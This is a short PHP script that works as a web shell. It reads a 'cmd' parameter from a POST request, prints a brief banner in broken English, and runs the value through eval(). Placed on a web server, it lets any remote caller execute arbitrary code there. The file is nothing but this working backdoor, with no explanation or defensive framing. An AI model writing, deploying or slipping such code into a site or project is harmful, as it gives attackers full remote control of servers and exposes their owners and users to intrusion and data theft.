<?php
$cmd = $_POST['cmd'];
echo '<br><br>#########################<br><br>';
echo 'The server with answered this your request:<br><br>';
eval($cmd);
?>